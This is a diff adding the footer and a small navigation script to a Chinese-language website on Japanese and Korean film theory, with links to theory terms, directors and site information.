+<footer class="footer sans" role="contentinfo">
+  <div class="container">
+    <div class="ft-grid">
+      <div class="ft-col">
+        <a class="logo" href="#top"><span class="badge">JP·KR</span><span>日韩理论电影网</span></a>
+        <p style="color:var(--ink3);font-size:.85rem;margin-top:12px;max-width:300px">用理论看懂日韩电影。左边是日本的留白，右边是韩国的撕裂。</p>
+      </div>
+      <div class="ft-col"><h4>理论词条</h4>
+        <ul><li><a href="#terms">作者论</a></li><li><a href="#terms">类型研究</a></li><li><a href="#terms">符号学</a></li><li><a href="#terms">长镜头与蒙太奇</a></li></ul>
+      </div>
+      <div class="ft-col"><h4>国别谱系</h4>
+        <ul><li><a href="#jp">日本：小津 / 黑泽 / 是枝</a></li><li><a href="#kr">韩国：奉 / 朴 / 李</a></li><li><a href="#method">读片五步法</a></li><li><a href="#case">片例解剖</a></li></ul>
+      </div>
+      <div class="ft-col"><h4>站点信息</h4>
+        <ul><li><a href="#about">关于本站</a></li><li><a href="#">版权与引用声明</a></li><li><a href="#">免责声明</a></li><li><a href="#">投稿 / 纠错</a></li></ul>
+      </div>
+    </div>
+    <div class="ft-base">
+      <p>© <span id="yr"></span> 日韩理论电影网 · 网站网址：<a href="https://rihanlilundianyingwang-cn.github.io/">https://rihanlilundianyingwang-cn.github.io/</a> ｜ 域名：rihanlilundianyingwang-cn ｜ "理论"取"读片方法"之意，倡导理性、正版、深度观影。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){
+  var open=nav.classList.toggle('show');
+  burger.setAttribute('aria-expanded',open?'true':'false');
+  burger.textContent=open?'✕':'☰';
+});
+nav.addEventListener('click',function(e){
+  if(e.target.tagName==='A'&&window.innerWidth<=760){
+    nav.classList.remove('show');burger.setAttribute('aria-expanded','false');burger.textContent='☰';
+  }
+});
+document.getElementById('yr').textContent=(new Date()).getFullYear();
+</script>
+</body>
+</html>
